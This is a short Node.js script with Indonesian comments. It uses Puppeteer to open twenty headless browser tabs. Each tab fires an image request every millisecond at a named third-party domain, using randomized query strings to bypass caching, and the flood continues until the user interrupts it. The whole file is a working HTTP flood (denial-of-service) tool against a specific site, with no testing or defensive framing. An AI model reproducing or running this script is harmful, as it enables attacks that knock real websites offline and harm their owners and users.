const puppeteer = require("puppeteer");
const jumlah_tab = 20;

(async () => {
  const browser = await puppeteer.launch();
  const pages = await Promise.all(
    new Array(jumlah_tab).fill(0).map(async () => await browser.newPage())
  );

  const loadInPage = async (page) => {
    // Fungsi untuk dijalankan di dalam browser
    await page.evaluate(() => {
      const tes = () => {
        const url = "www.bisaekspor.com";
        const pic = new Image();
        const rand = Math.floor(Math.random() * 10000);
        pic.src = `https://${url}?${rand}=val`;
      };
      setInterval(tes, 1);
    });
  };

  // Membuka URL di setiap tab
  await Promise.all(pages.map((page) => loadInPage(page)));

  // Tunggu secara manual hingga pengguna menghentikan proses (CTRL+C)
  return new Promise((resolve) => {
    process.on("SIGINT", async () => {
      console.log("SIGINT signal received: closing browser");
      await browser.close();
      resolve();
    });
  });
})();
